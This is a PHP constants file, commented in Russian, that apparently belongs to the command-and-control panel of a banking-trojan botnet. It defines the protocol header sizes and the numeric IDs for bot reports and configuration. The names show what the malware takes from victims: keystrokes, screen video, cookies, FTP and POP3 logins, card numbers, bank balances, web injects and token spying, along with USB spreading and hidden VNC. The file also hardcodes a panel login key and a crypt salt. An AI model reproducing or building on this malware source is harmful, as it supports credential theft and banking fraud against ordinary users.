<?php
///////////////////////////////////////////////////////////////////////////////////////////////////
// Константы.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Кодовая странци для MySQL.
define('MYSQL_CODEPAGE', 'utf8');
define('MYSQL_COLLATE',  'utf8_unicode_ci');

//Ботнет по умолчанию. Менять не рекомендуется.
define('DEFAULT_BOTNET', '-- default --');

//Некотрые данные о протоколе.
define('HEADER_PREFIX',    32); //sizeof(BinStorage::STORAGE)
define('HEADER_SIZE',      60); //sizeof(BinStorage::STORAGE)
define('HEADER_MD5',       44); //OFFSETOF(BinStorage::STORAGE, MD5Hash)
define('ITEM_HEADER_SIZE', 16); //sizeof(BinStorage::ITEM)

//Конастанты сгенерированые из defines.php
define('SBCID_BOT_ID', 10001);
define('SBCID_BOTNET', 10002);
define('SBCID_BOT_VERSION', 10003);
define('SBCID_NET_LATENCY', 10005);
define('SBCID_TCPPORT_S1', 10006);
define('SBCID_PATH_SOURCE', 10007);
define('SBCID_PATH_DEST', 10008);
define('SBCID_TIME_SYSTEM', 10009);
define('SBCID_TIME_TICK', 10010);
define('SBCID_TIME_LOCALBIAS', 10011);
define('SBCID_OS_INFO', 10012);
define('SBCID_LANGUAGE_ID', 10013);
define('SBCID_PROCESS_NAME', 10014);
define('SBCID_PROCESS_USER', 10015);
define('SBCID_IPV4_ADDRESSES', 10016);
define('SBCID_IPV6_ADDRESSES', 10017);
define('SBCID_BOTLOG_TYPE', 10018);
define('SBCID_BOTLOG', 10019);
define('SBCID_PROCESS_INFO', 10020);
define('SBCID_LOGIN_KEY', 10021);
define('SBCID_REQUEST_FILE', 10022);
define('SBCID_REFERAL_LINK', 10023);
define('SBCID_ADMIN_GROUP', 10024);
define('SBCID_BATTERY_INFO', 10025);
define('SBCID_SCRIPT_ID', 11000);
define('SBCID_SCRIPT_STATUS', 11001);
define('SBCID_SCRIPT_RESULT', 11002);
define('SBCID_MODULES_TYPE', 12000);
define('SBCID_MODULES_VERSION', 12001);
define('SBCID_MODULES_DATA', 12002);
define('CFGID_LAST_VERSION', 20001);
define('CFGID_LAST_VERSION_URL', 20002);
define('CFGID_URL_SERVER_0', 20003);
define('CFGID_URL_ADV_SERVERS', 20004);
define('CFGID_HTTP_FILTER', 20005);
define('CFGID_HTTP_POSTDATA_FILTER', 20006);
define('CFGID_HTTP_INJECTS_LIST', 20007);
define('CFGID_DNS_LIST', 20008);
define('CFGID_DNS_FILTER', 20009);
define('CFGID_CMD_LIST', 20010);
define('CFGID_HTTP_MAGICURI_LIST', 20011);
define('CFGID_FILESEARCH_KEYWORDS', 20012);
define('CFGID_FILESEARCH_EXCLUDES_NAME', 20013);
define('CFGID_FILESEARCH_EXCLUDES_PATH', 20014);
define('CFGID_KEYLOGGER_PROCESSES', 20015);
define('CFGID_KEYLOGGER_TIME', 20016);
define('CFGID_FILESEARCH_MINYEAR', 20017);
define('CFGID_WEBINJECTS_URL', 20018);
define('CFGID_TOKENSPY_URL', 20019);
define('CFGID_HTTPVIP_URLS', 20020);
define('CFGID_NETSCAN_HOSTNAME', 20021);
define('CFGID_NETSCAN_ADDRTYPE', 20022);
define('CFGID_NETSCAN_PORTTYPE', 20023);
define('CFGID_NETSCAN_PORTS', 20024);
define('CFGID_NETSCAN_SCANTYPE', 20025);
define('CFGID_AUTOCOPY_URL', 20026);
define('CFGID_AUTOCOPY_USB_COUNT', 20027);
define('CFGID_AUTOCOPY_ENABLED', 20028);
define('CFGID_AUTOCOPY_DISABLED', 20029);
define('CFGID_VIDEOLOGGER_PROCESSES', 20030);
define('CFGID_VIDEOLOGGER_TIME', 20031);
define('CFGID_AUTOCOPY_LINKNAME', 20032);
define('CFGID_FILEGATE_URL', 20033);
define('CFGID_VIDEO_X_SCALE', 20101);
define('CFGID_VIDEO_Y_SCALE', 20102);
define('CFGID_VIDEO_FPS', 20103);
define('CFGID_VIDEO_KPS', 20104);
define('CFGID_VIDEO_CPU', 20105);
define('CFGID_VIDEO_TIME', 20106);
define('CFGID_VIDEO_QUALITY', 20107);
define('CFGID_MONEY_PARSER_ENABLED', 20201);
define('CFGID_MONEY_PARSER_INCLUDE', 20202);
define('CFGID_MONEY_PARSER_EXCLUDE', 20203);
define('BLT_UNKNOWN', 0);
define('BLT_COOKIES', 1);
define('BLT_FILE', 2);
define('BLT_DEBUG', 3);
define('BLT_HTTP_REQUEST', 11);
define('BLT_HTTPS_REQUEST', 12);
define('BLT_LUHN10_REQUEST', 13);
define('BLT_LOGIN_FTP', 100);
define('BLT_LOGIN_POP3', 101);
define('BLT_FILE_SEARCH', 102);
define('BLT_KEYLOGGER', 103);
define('BLT_FLASHINFECT', 104);
define('BLT_MEGAPACKAGE', 1000);
define('BLT_GRABBED_UI', 200);
define('BLT_GRABBED_HTTP', 201);
define('BLT_GRABBED_WSOCKET', 202);
define('BLT_GRABBED_FTPSOFTWARE', 203);
define('BLT_GRABBED_EMAILSOFTWARE', 204);
define('BLT_GRABBED_BALANCE', 205);
define('BLT_GRABBED_OTHER', 299);
define('BLT_COMMANDLINE_RESULT', 300);
define('BLT_ANALYTICS_SOFTWARE', 400);
define('BLT_ANALYTICS_FIREWALL', 401);
define('BLT_ANALYTICS_ANTIVIRUS', 402);
define('BLT_ANALYTICS_KEYMAP', 403);
define('BLT_NETSCAN_RESULT', 500);
define('BMT_VIDEO', 1);
define('BMT_FFCOOKIE', 2);
define('BMT_HVNC', 3);
define('BOT_ID_MAX_CHARS', 100);
define('BOTNET_MAX_CHARS', 20);
define('BOTCRYPT_MAX_SIZE', 409600);
define('MAXLIMIT', 0);
define('BO_CLIENT_VERSION', '1.01');
define('BO_LOGIN_KEY', '533D9226E4C1CE0A9815DBEB19235AE4');
define('BO_CRYPT_SALT', 0xF2C9CDEF);
define('BO_REFERAL', 1);

# BLT_DEBUG report type, path_source
define('BLT_DEBUG_PATHSRC_WEBINJECTS', 35);

# Battery info constants
define('BOT_BATT_AC_DISCONNECTED',  0x00);
define('BOT_BATT_AC_CONNECTED',     0x01);
define('BOT_BATT_AC_UNKNOWN',       0x02);
define('BOT_BATT_FLAG_CRITICAL',    0x02);
define('BOT_BATT_FLAG_LOW',         0x04);
define('BOT_BATT_FLAG_HIGH',        0x06);
define('BOT_BATT_FLAG_CHARGE',      0x08);
define('BOT_BATT_FLAG_UNKNOWN',     0x10);
